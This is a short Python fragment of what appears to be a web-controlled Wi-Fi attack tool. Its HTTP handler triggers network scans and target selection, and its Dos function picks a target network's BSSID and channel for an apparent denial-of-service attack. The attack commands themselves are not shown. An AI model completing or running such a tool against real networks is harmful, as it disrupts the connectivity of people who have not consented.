...
class handler(BaseHTTPRequestHandler):
  def do_GET(self):
    print (self.path)
    x = ["/success?target=0", "/success?target=1", "/success?target=2", "/success?target=3", "/success?target=4", "/success?target=5", "/success?target=6", "/success?target=7", "/success?target=8", "/success?target=9"]
    if self.path == '/':
      f = index_html
    if self.path == '/scan?':
      scan()
...
def Dos(target_id):
  hackbssid = active_wireless_networks[int(target_id)]["BSSID"]
  hackchannel = active_wireless_networks[int(target_id)]["channel"].strip()
